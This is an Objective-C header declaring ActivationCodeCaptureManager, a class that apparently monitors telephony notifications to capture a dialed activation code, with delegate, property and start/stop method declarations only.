//
//  ActivationCodeCaptureManager.h
//  ActivationCodeCapture
//
//  Created by Makara Khloth on 11/23/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "ActivationCodeCaptureDelegate.h"
#import "TelephonyNotificationManager.h"

@class TelephonyNotificationManagerImpl, NoteACCapture;

@interface ActivationCodeCaptureManager : NSObject {
@private
	id <TelephonyNotificationManager>	mTelephonyNotificationManager;
	TelephonyNotificationManagerImpl*	mTelephonyNotificationManagerImpl;
	NoteACCapture	*mNoteACCapture;
	
	id <ActivationCodeCaptureDelegate>	mDelegate;
	
	NSString*	mDialNumber;
	NSString	*mAC;
	BOOL		mActivationCodeDialing;
	BOOL		mListening;
}

@property (nonatomic, copy) NSString *mAC;
@property (nonatomic, copy) NSString *mDialNumber;
@property (nonatomic, assign) BOOL mActivationCodeDialing;

- (id) initWithDelegate: (id <ActivationCodeCaptureDelegate>) aDelegate;
- (id) initWithTelephonyNotification: (id <TelephonyNotificationManager>) aManager andDelegate: (id <ActivationCodeCaptureDelegate>) aDelegate;

- (void) startCaptureActivationCode;
- (void) stopCaptureActivationCode;

@end
